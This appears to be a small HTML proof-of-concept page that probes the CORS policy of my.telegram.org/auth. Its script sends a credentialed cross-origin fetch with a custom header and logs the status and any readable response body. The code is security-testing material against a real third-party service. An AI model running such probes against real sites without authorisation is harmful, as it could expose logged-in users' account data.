<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Simple CORS Proof — my.telegram.org</title>
  <style>body{font-family:Arial;padding:16px}pre{background:#111;color:#fff;padding:12px;border-radius:6px;max-height:320px;overflow:auto}</style>
</head>
<body>
  <h2>Simple CORS PoC — my.telegram.org</h2>
  <p>
    This PoC forces a CORS preflight (OPTIONS) by sending a custom header. Open <strong>DevTools → Network</strong> before clicking Run.
  </p>

  <label>Endpoint: <input id="endpoint" style="width:70%" value="https://my.telegram.org/auth"></label>
  <div style="margin-top:10px">
    <button id="run">Run fetch (credentials: include)</button>
    <button id="runNoCred">Run fetch (no credentials)</button>
  </div>

  <h3>Status / Debug</h3>
  <div id="status">idle</div>
  <h4>Console log (also check DevTools → Network)</h4>
  <pre id="log">-</pre>

<script>
const log = txt => {
  const el = document.getElementById('log');
  el.innerText = (el.innerText === '-' ? '' : el.innerText + '\n') + txt;
};
document.getElementById('run').onclick = ()=>runFetch('include');
document.getElementById('runNoCred').onclick = ()=>runFetch('omit');

async function runFetch(creds){
  const ep = document.getElementById('endpoint').value;
  document.getElementById('status').innerText = 'Running (credentials: ' + creds + ') — open DevTools→Network to inspect OPTIONS/GET';
  log('Starting fetch to: ' + ep + ' (credentials: ' + creds + ')');

  try {
    // custom header forces preflight so DevTools will show OPTIONS response
    const r = await fetch(ep, {
      method: 'GET',
      mode: 'cors',
      credentials: creds,
      headers: { 'X-Poc-Test': '1' }
    });
    log('Fetch returned status: ' + r.status + ' ' + r.statusText);
    try {
      const text = await r.text();
      log('Body (preview): ' + text.slice(0,1000));
    } catch(e) {
      log('Error reading body: ' + e);
    }
    document.getElementById('status').innerText = 'Fetch completed (see log & Network)';
  } catch (e) {
    // expected in many CORS cases; still OK — Network tab will contain OPTIONS/GET
    log('Fetch threw exception: ' + (e && e.toString ? e.toString() : JSON.stringify(e)));
    document.getElementById('status').innerText = 'Fetch threw exception. Inspect Network → OPTIONS/GET entries.';
  }
}
</script>
</body>
</html>
